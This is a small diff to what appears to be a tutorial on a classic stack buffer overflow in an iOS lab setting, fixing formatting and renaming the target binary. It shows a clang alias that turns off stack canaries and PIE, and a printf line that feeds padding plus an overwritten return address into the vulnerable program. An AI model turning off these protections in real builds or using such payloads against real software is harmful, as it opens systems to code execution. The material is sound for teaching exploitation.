@@ -3,7 +3,7 @@ Classic Stack Buffer Overflow
 
 **An alias to compile without protection using clang**
 
-Where ``-mno-thumb`` is used to force 32 bits instead of 16 bits, `-fno-stack-protector` to disable stack canaries and ``-fno-pie`` to disable ASLR.
+Where ``-mno-thumb`` is used to force 32 bits instead of 16 bits, ``-fno-stack-protector`` to disable stack canaries and ``-fno-pie`` to disable ASLR.
 
 ``alias clangd="clang -isysroot /var/theos/sdks/iPhoneOS9.3.sdk -mno-thumb -fno-stack-protector -fno-pie"``
 
@@ -23,4 +23,4 @@ This can be found using ``disassemble secret`` in gdb.
 
 **Using "printf" to input malicious data into the binary**
 
-``printf "AAAABBBBCCCCDDDDEEEE\x58\xbf\x00\x00" | ./vuln``
+``printf "AAAABBBBCCCCDDDDEEEE\x58\xbf\x00\x00" | ./vulnerable``
